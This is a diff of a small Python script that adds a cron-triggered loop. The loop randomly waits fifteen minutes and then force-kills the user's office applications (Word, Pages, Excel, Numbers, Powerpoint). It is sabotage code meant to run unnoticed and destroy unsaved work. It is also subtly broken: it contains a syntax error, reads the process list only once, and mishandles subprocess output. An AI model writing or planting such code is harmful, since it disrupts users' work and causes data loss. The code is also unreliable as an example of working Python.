@@ -1,10 +1,34 @@
 #!/usr/bin/env python3
 import os
 import subprocess
-cronJobs = subprocess.check_output("crontab -l", shell = True)
+import time
+import random
+
+cronJobs	= subprocess.check_output("crontab -l", shell = True)
+activeUser	= subprocess.check_output("whoami", shell = True)
+psCommand	= ("ps -u " + activeUser)
+processes	= subprocess.check_output(psCommand, shell = True)
 
 def go():
-	return
+	while 7 == 7:
+		doIt = random.choice(range(2))
+		if doIt = 0:
+			if "Word" in processes:
+				time.sleep(900)
+				os.system("pkill Word")
+			elif "Pages" in processes:
+				time.sleep(900)
+				os.system("pkill Pages")
+			elif "Excel" in processes:
+				time.sleep(900)
+				os.system("pkill Excel")
+			elif "Numbers" in processes:
+				time.sleep(900)
+				os.system("pkill Numbers")
+			elif "Powerpoint" in processes:
+				time.sleep(900)
+				os.system("pkill Powerpoint")
+
 
 if __file__ in str(cronJobs):
 	go()
